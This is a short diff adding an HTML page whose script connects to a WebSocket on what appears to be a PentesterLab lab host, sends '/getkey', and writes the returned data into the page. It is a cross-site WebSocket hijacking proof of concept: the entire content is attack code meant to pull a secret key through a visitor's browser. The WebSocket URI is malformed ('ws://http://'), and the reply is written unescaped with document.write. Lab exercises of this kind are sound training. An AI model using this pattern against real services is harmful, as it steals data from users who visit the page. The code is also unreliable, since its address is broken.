@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<script>
+	var uri = "ws://http://ptl-4c3bbc05-f08997d6.libcurl.so/";
+	var ws = new WebSocket(uri);
+	ws.onmessage = function(message) {
+		var data = JSON.parse(message.data);
+		document.write(data.text+"<br>");
+	};
+	ws.send(JSON.stringify({text: "/getkey"}));
+		</script>
+	</body>
+</html>
